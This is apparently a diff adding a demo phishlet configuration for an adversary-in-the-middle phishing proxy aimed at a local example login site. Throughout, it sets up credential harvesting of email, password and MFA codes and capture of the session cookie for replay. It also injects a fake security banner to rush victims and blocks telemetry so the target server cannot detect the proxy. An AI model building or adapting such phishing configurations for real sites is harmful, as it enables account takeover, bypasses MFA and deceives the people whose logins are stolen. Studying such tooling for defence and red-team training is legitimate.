@@ -1,0 +1,95 @@
+name: form-login
+author: demo
+version: "1"
+
+# Attacks the form-based login of the target-site example (examples/target-site/).
+# Demonstrates: sub_filters, force_post, intercept, js_inject, auth_tokens
+# type: cookie, credentials type: post, and custom credential capture (MFA code).
+
+proxy_hosts:
+  - phish_sub: login
+    orig_sub:  login
+    domain:    target.local
+    is_landing: true
+    upstream_scheme: http
+
+sub_filters:
+  # Rewrite absolute URLs that include the scheme — must run before the bare
+  # domain rule below, otherwise "http://login.target.local/..." becomes
+  # "http://login.phish.local/..." which the browser can't reach (the proxy
+  # only serves HTTPS).
+  - hostname:   login.target.local
+    mime_types: [text/html, text/javascript, application/javascript]
+    search:     'http://login\.target\.local'
+    replace:    'https://{hostname}'
+
+  # Rewrite any remaining bare domain references (e.g. in href="//target.local/..."
+  # or plain text) in both HTML and JavaScript responses.
+  - hostname:   login.target.local
+    mime_types: [text/html, text/javascript, application/javascript]
+    search:     target\.local
+    replace:    '{domain}'
+
+force_post:
+  # The server requires login_source=web to distinguish browser logins from API
+  # logins. The original form includes it as a hidden field, but sub_filters or
+  # JS execution issues during proxying can cause it to be missing or mangled.
+  # force_post ensures the param is always present before forwarding upstream.
+  - path: "^/login$"
+    conditions:
+      - key:    "^email$"
+        search: "^.+$"
+    params:
+      - key:   login_source
+        value: web
+
+intercept:
+  # The target site's JS sends browser telemetry on page load. If forwarded
+  # through the proxy, the server logs fingerprint data that could reveal the
+  # proxied session (mismatched IP, unusual TLS fingerprint, etc.). Intercept
+  # swallows the request and returns a success response without forwarding.
+  - path:         "^/api/telemetry$"
+    status:       200
+    content_type: application/json
+    body:         '{"status":"ok"}'
+
+js_inject:
+  # Inject a fake security banner on the login page to add urgency. The victim
+  # sees it while filling in their credentials — well before session completion.
+  - trigger_domain: login.target.local
+    trigger_path:   "^/login"
+    script: |
+      (function() {
+        var b = document.createElement("div");
+        b.style.cssText = "background:#fef3c7;border-bottom:1px solid #fcd34d;padding:10px 32px;font-size:13px;color:#92400e;";
+        b.innerHTML = "<strong>Security notice:</strong> Unusual activity detected on your account. Please verify your identity.";
+        document.body.insertBefore(b, document.body.firstChild);
+      })();
+
+auth_tokens:
+  - domain: ".target.local"
+    keys:
+      - name: auth_session
+        required: true
+
+credentials:
+  username:
+    key:    "^email$"
+    search: "^(.+)$"
+    type:   post
+  password:
+    key:    "^password$"
+    search: "^(.+)$"
+    type:   post
+  custom:
+    # Capture the MFA code submitted to /mfa — a key goal of AiTM attacks is
+    # obtaining the OTP before it expires so the attacker can replay the session.
+    - name:   totp_code
+      key:    "^code$"
+      search: "^(.+)$"
+      type:   post
+
+login:
+  domain: login.target.local
+  # No path restriction — credential rules fire on any POST to the login domain,
+  # covering both /login (email+password) and /mfa (totp_code).
